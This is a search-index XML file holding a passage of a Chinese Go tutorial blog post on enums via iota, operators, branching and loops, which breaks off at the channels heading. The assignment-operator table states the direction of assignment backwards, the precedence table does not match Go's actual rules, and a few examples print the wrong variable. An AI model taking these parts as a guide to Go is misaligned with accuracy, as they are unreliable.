<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Go语言基础学习(二)</title>
    <link href="/2023/04/23/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/"/>
    <url>/2023/04/23/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<h2 id="Go语言中代替枚举的办法"><a href="#Go语言中代替枚举的办法" class="headerlink" title="Go语言中代替枚举的办法"></a>Go语言中代替枚举的办法</h2><p><strong>枚举类型</strong>用于声明一组命名的常量，当一个变量有几种可能的取值时，可以将它定义为<strong>枚举类型</strong>。在 Go 语言中，并没有提供<strong>枚举类型</strong>，但是枚举类型又是开发过程中非常重要的数据类型。因为它可以事先定义一组<strong>有效的值</strong>，可以有效地防止用户提交无效数据，抽象到业务场景中就是我们平时网页上遇到的<strong>下拉框</strong>，或者我们选择快递地址时的<strong>省市信息</strong>，均为枚举类型的用武之地。所以在 Go 语言中对常量进行了一定的<strong>扩展</strong>，使其可以完美地替代枚举类型。</p><h3 id="1-常量中的iota"><a href="#1-常量中的iota" class="headerlink" title="1. 常量中的iota"></a>1. 常量中的iota</h3><p>为了使常量可以更好地替代枚举类型，Go 语言提供了一个<code>iota</code>关键字。使用<code>iota</code>初始化常量，可以生成一组规则类似的常量，但是不用每个常量都写一遍表达式。在一个<code>const()</code>表达式中，从<code>iota</code>开始的常量会被<strong>置为0</strong>，向后每个常量的值为<strong>前一个</strong>常量的值<strong>加一</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> Weekday <span class="hljs-type">int</span> <span class="hljs-comment">//自定义一个星期类型，作为枚举类型</span><br><br><span class="hljs-keyword">const</span> (<br>Sun Weekday = <span class="hljs-literal">iota</span><br>Mon<br>Tues<br>Wed<br>Thur<br>Fri<br>Sat<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Sun :&quot;</span>, Sun)<br>fmt.Println(<span class="hljs-string">&quot;Mon :&quot;</span>, Mon)<br>fmt.Println(<span class="hljs-string">&quot;Tues:&quot;</span>, Tues)<br>fmt.Println(<span class="hljs-string">&quot;Wed :&quot;</span>, Wed)<br>fmt.Println(<span class="hljs-string">&quot;Thur:&quot;</span>, Thur)<br>fmt.Println(<span class="hljs-string">&quot;Fri :&quot;</span>, Fri)<br>fmt.Println(<span class="hljs-string">&quot;Sat :&quot;</span>, Sat)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Sun</span> : <span class="hljs-number">0</span><br><span class="hljs-attribute">Mon</span> : <span class="hljs-number">1</span><br><span class="hljs-attribute">Tues</span>: <span class="hljs-number">2</span><br><span class="hljs-attribute">Wed</span> : <span class="hljs-number">3</span><br><span class="hljs-attribute">Thur</span>: <span class="hljs-number">4</span><br><span class="hljs-attribute">Fri</span> : <span class="hljs-number">5</span><br><span class="hljs-attribute">Sat</span> : <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h3 id="2-将枚举值转换为字符串"><a href="#2-将枚举值转换为字符串" class="headerlink" title="2. 将枚举值转换为字符串"></a>2. 将枚举值转换为字符串</h3><p>使用<code>iota</code>是可以使用 Go 语言的常量代替枚举类型，但是由于输出值均为阿拉伯数字，给调试和辨识造成了一定的困难。为了解决这一问题，Go 语言还提供了使常量枚举值输出为字符串的办法。需要我们手动构造一个使用枚举类型输出字符串的方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Weekday <span class="hljs-type">int</span> <span class="hljs-comment">//自定义一个星期类型，作为枚举类型</span><br><br><span class="hljs-keyword">const</span> (<br>    Sun Weekday = <span class="hljs-literal">iota</span><br>    Mon<br>    Tues<br>    Wed<br>    Thur<br>    Fri<br>    Sat<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w Weekday)</span></span> String() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">switch</span> w &#123;<br>    <span class="hljs-keyword">case</span> Sun:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Sun&quot;</span><br>    <span class="hljs-keyword">case</span> Mon:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Mon&quot;</span><br>    <span class="hljs-keyword">case</span> Tues:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Tues&quot;</span><br>    <span class="hljs-keyword">case</span> Wed:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Wed&quot;</span><br>    <span class="hljs-keyword">case</span> Thur:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Thur&quot;</span><br>    <span class="hljs-keyword">case</span> Fri:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Fri&quot;</span><br>    <span class="hljs-keyword">case</span> Sat:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Sat&quot;</span><br>    &#125;<br>    <span class="hljs-comment">//不存在的枚举类型就返回&quot;N/A&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;N/A&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;Sun :&quot;</span>, Sun)<br>    fmt.Println(<span class="hljs-string">&quot;Mon :&quot;</span>, Mon)<br>    fmt.Println(<span class="hljs-string">&quot;Tues:&quot;</span>, Tues)<br>    fmt.Println(<span class="hljs-string">&quot;Wed :&quot;</span>, Wed)<br>    fmt.Println(<span class="hljs-string">&quot;Thur:&quot;</span>, Thur)<br>    fmt.Println(<span class="hljs-string">&quot;Fri :&quot;</span>, Fri)<br>    fmt.Println(<span class="hljs-string">&quot;Sat :&quot;</span>, Sat)<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Go语言中的运算符"><a href="#Go语言中的运算符" class="headerlink" title="Go语言中的运算符"></a>Go语言中的运算符</h2><h3 id="1-语言的赋值运算符"><a href="#1-语言的赋值运算符" class="headerlink" title="1. 语言的赋值运算符"></a>1. 语言的赋值运算符</h3><p>Go语言赋值运算符如下表所示：</p><table><thead><tr><th align="left">运算符</th><th align="left">结合性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将左边的实体赋值给右边的变量</td></tr><tr><td align="left">+&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>加运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">-&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>减运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">*&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>乘运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">&#x2F;&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>除运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">%&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>取余运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">&gt;&gt;&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>右位移运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">&lt;&lt;&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>左位移运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">&amp;&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>与运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">|&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>或运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">^&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>异或运算之后</strong>赋值给右边的变量</td></tr></tbody></table><p>代码示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-number">28</span><br>    <span class="hljs-keyword">var</span> b = <span class="hljs-number">99</span><br>    a = b<br>    fmt.Println(<span class="hljs-string">&quot;  a = b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a += b<br>    fmt.Println(<span class="hljs-string">&quot; a += b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a -= b<br>    fmt.Println(<span class="hljs-string">&quot; a -= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a *= b<br>    fmt.Println(<span class="hljs-string">&quot; a *= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a /= <span class="hljs-number">2</span><br>    fmt.Println(<span class="hljs-string">&quot; a /= 2 :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    b %= <span class="hljs-number">1</span><br>    fmt.Println(<span class="hljs-string">&quot; b %= 1 :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a &amp;= b<br>    fmt.Println(<span class="hljs-string">&quot; a &amp;= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a |= b<br>    fmt.Println(<span class="hljs-string">&quot; a |= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a ^= b<br>    fmt.Println(<span class="hljs-string">&quot; a ^= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a &gt;&gt;= <span class="hljs-number">2</span><br>    fmt.Println(<span class="hljs-string">&quot;a &gt;&gt;= 2 :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    b &lt;&lt;= <span class="hljs-number">1</span><br>    fmt.Println(<span class="hljs-string">&quot;b &lt;&lt;= 1 :&quot;</span>, a)<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-优先级"><a href="#2-优先级" class="headerlink" title="2. 优先级"></a>2. 优先级</h3><p>下表为各运算符的优先级示图，优先级<strong>从高到低</strong>：</p><table><thead><tr><th align="left">优先级</th><th align="left">类别</th><th align="left">运算符</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">括号运算符</td><td align="left">()</td></tr><tr><td align="left">2</td><td align="left">单目运算符</td><td align="left">！、++、–</td></tr><tr><td align="left">3</td><td align="left">算数运算符</td><td align="left">*、&#x2F;、%</td></tr><tr><td align="left">4</td><td align="left">+、-</td><td align="left"></td></tr><tr><td align="left">5</td><td align="left">位移运算符</td><td align="left">&gt;&gt;、&lt;&lt;</td></tr><tr><td align="left">6</td><td align="left">关系运算符</td><td align="left">&lt;、&lt;&#x3D;、&gt;、&gt;&#x3D;</td></tr><tr><td align="left">7</td><td align="left">&#x3D;&#x3D;、!&#x3D;</td><td align="left"></td></tr><tr><td align="left">8</td><td align="left">按位与</td><td align="left">&amp;</td></tr><tr><td align="left">9</td><td align="left">按位异或</td><td align="left">^</td></tr><tr><td align="left">10</td><td align="left">按位或</td><td align="left">|</td></tr><tr><td align="left">11</td><td align="left">逻辑与</td><td align="left">&amp;&amp;</td></tr><tr><td align="left">12</td><td align="left">逻辑或</td><td align="left">||</td></tr><tr><td align="left">13</td><td align="left">赋值运算符</td><td align="left">&#x3D;、+&#x3D;、-&#x3D;、*&#x3D;、&#x2F;&#x3D;、 %&#x3D;、 &gt;&#x3D;、 &lt;&lt;&#x3D;、&amp;&#x3D;、^&#x3D;、|&#x3D;</td></tr></tbody></table><h2 id="Go语言的分支语句"><a href="#Go语言的分支语句" class="headerlink" title="Go语言的分支语句"></a>Go语言的分支语句</h2><h3 id="1-If…else"><a href="#1-If…else" class="headerlink" title="1. If…else"></a>1. If…else</h3><p>在 Go 语言中 <strong>if</strong> 关键字的作用和其它大部分语言相同，是用于测试某个布尔表达式或布尔值是否为真的。若为真则执行 if 之后 <code>&#123;&#125;</code> 中的语句，否则跳过这些语句。如果存在第二个分支，则需要使用 <strong>else</strong> 关键字，还需要增加分支的话就需要使用 <strong>else if</strong> 关键字了。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> a &gt; <span class="hljs-number">10</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a大于10&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> a &lt; <span class="hljs-number">0</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a小于0&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a的值是&quot;</span>, a)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在 Go 语言中，<strong>if</strong> 后的条件表达式，还有一种特别的写法，可以在条件表达式之前写一个赋值表达式。</p><p><strong>if…else</strong> 的特殊用法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> a := <span class="hljs-number">10</span>; a &gt; <span class="hljs-number">10</span> &#123; <span class="hljs-comment">//赋值表达式和条件表达式之间用;隔开</span><br>fmt.Println(<span class="hljs-string">&quot;a大于10&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a的值是&quot;</span>, a)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-switch…case"><a href="#2-switch…case" class="headerlink" title="2. switch…case"></a>2. switch…case</h3><p>Go 语言对 <strong>switch…case</strong> 的功能进行了扩展，它变得更加的通用。<strong>switch</strong> 之后可以什么都不带。<strong>case</strong>也无需是一个固定值，也可以是一个布尔表达式，而且每一个 case 都是一个 <strong>独立的代码块</strong>，执行完了之后<strong>立刻跳出</strong> switch，不需要使用 <strong>break</strong>。所以可以把 <strong>if…else</strong> 完美的改写成 <strong>switch…case</strong> 的形式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-string">&quot;A&quot;</span><br><span class="hljs-keyword">switch</span> a &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;分数区间为90~100&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;分数区间为70～89&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;分数区间为0~70&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;错误的评分&quot;</span>)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>switch…case</strong> Go 语言中的新用法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">50</span><br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> a &lt; <span class="hljs-number">60</span>:<br>fmt.Println(<span class="hljs-string">&quot;不及格&quot;</span>)<br><span class="hljs-keyword">case</span> a &lt; <span class="hljs-number">80</span>:<br>fmt.Println(<span class="hljs-string">&quot;良好&quot;</span>)<br><span class="hljs-keyword">case</span> a &lt;= <span class="hljs-number">100</span>:<br>fmt.Println(<span class="hljs-string">&quot;优秀&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;分数最多为100分&quot;</span>)<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Go语言的循环语句"><a href="#Go语言的循环语句" class="headerlink" title="Go语言的循环语句"></a>Go语言的循环语句</h2><p>在 Go 语言中减少了循环语句的关键字，仅有一个 <strong>for</strong> 关键字。但是并没有减少其功能，而且它更是兼容了其它语言中的<strong>while</strong>关键字的用法，甚至更强大。</p><h3 id="1-for循环语句"><a href="#1-for循环语句" class="headerlink" title="1. for循环语句"></a>1. for循环语句</h3><h4 id="1-1-普通用法"><a href="#1-1-普通用法" class="headerlink" title="1.1 普通用法"></a>1.1 普通用法</h4><p>在 Go 语言中，for 循环之后一样可以跟三个语句</p><p><strong>单次表达式；条件表达式；末尾循环体</strong></p><p>但是它不需要使用<code>()</code>来包裹这三个表达式，写法上更加的简洁。同时它也和其它语言一样，可以任意省略这三个表达式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> a := <span class="hljs-number">0</span>; a &lt; <span class="hljs-number">10</span>; a++ &#123;<br>fmt.Println(a)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>省略<strong>单次表达式</strong>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   a := <span class="hljs-number">0</span><br>   <span class="hljs-keyword">for</span> ; a &lt; <span class="hljs-number">10</span>; a++ &#123; <span class="hljs-comment">//表达式可以省略，但是;不能省略</span><br>      fmt.Println(a)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-2-代替-while-的用法"><a href="#1-2-代替-while-的用法" class="headerlink" title="1.2 代替 while 的用法"></a>1.2 代替 while 的用法</h4><p>在其它大部分语言中 <strong>for</strong> 循环中省略<strong>单次表达式</strong>和<strong>末尾循环体</strong>其实就和其它语句中的 <strong>while</strong> 用法一致了。所以在 Go 语言中，直接使用省去<strong>单次表达式</strong>和<strong>末尾循环体</strong>的 <strong>for</strong> 循环语句来代替 <strong>while</strong> 的用法，为了简便代码书写，Go 语言中 for 循环语句在省去<strong>单次表达式</strong>和<strong>末尾循环体</strong>时，可以不写分号。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> a &lt; <span class="hljs-number">10</span> &#123; <span class="hljs-comment">//和其他语言中的while(a&lt;10)一致</span><br>fmt.Println(a)<br>a++<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-for-语言中的break-和-continue"><a href="#2-for-语言中的break-和-continue" class="headerlink" title="2. for 语言中的break 和 continue"></a>2. for 语言中的break 和 continue</h3><p>在我们的生产环境中，经常需要用到死循环的场景。所以在 Go 语言中新增了一个 <strong>for</strong> 关键字死循环的用法，让程序员不用写无聊的 <code>for(;;)&#123;&#125;</code>和<code>do&#123;&#125; while(1)</code>。同时可以使用 <strong>break</strong> 和 <strong>continue</strong> 来控制循环。</p><p><strong>break</strong> 和 <strong>continue</strong> 的逻辑和语法类似</p><h4 id="2-1-break跳出单层死循环"><a href="#2-1-break跳出单层死循环" class="headerlink" title="2.1  break跳出单层死循环"></a>2.1  break跳出单层死循环</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   a := <span class="hljs-number">0</span><br>   <span class="hljs-keyword">for</span> &#123; <span class="hljs-comment">//死循环的写法就是省略 单次表达式; 条件表达式; 末尾循环体</span><br>      fmt.Println(a)<br>      a++<br>      <span class="hljs-keyword">if</span> a &gt;= <span class="hljs-number">10</span> &#123;<br>         <span class="hljs-keyword">break</span> <span class="hljs-comment">//跳出死循环</span><br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-2-break跳出多层死循环"><a href="#2-2-break跳出多层死循环" class="headerlink" title="2.2 break跳出多层死循环"></a>2.2 break跳出多层死循环</h4><p>在其它语言中，你很难去控制跳出循环的层数，在 Go 语言中提供了一种<code>break LOOP</code>的写法，可以使循环跳出到 LOOP 所在的位置。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   a := <span class="hljs-number">0</span><br>LOOP:<br>   <span class="hljs-keyword">for</span> &#123;<br>      <span class="hljs-keyword">for</span> &#123;<br>         fmt.Println(a)<br>         a++<br>         <span class="hljs-keyword">if</span> a &gt;= <span class="hljs-number">10</span> &#123;<br>            <span class="hljs-keyword">break</span> LOOP <span class="hljs-comment">//跳出循环至LOOP所在的层级</span><br>         &#125;<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Go语言的通道"><a href="#Go语言的通道" class="headerlink" title="Go语言的通道"></a>Go语言的通道</h2><p>Go 语言中有一个特殊的类型 <code>chan</code>，这是在 Go 语言的多线程操作中非常重要的一个数据类型。它的一般用于<strong>线程之间的数据传输</strong>，所以这个操作类型叫做 “ <strong>通道 (channel)</strong>“。</p><h3 id="1-通道的声明和定义"><a href="#1-通道的声明和定义" class="headerlink" title="1. 通道的声明和定义"></a>1. 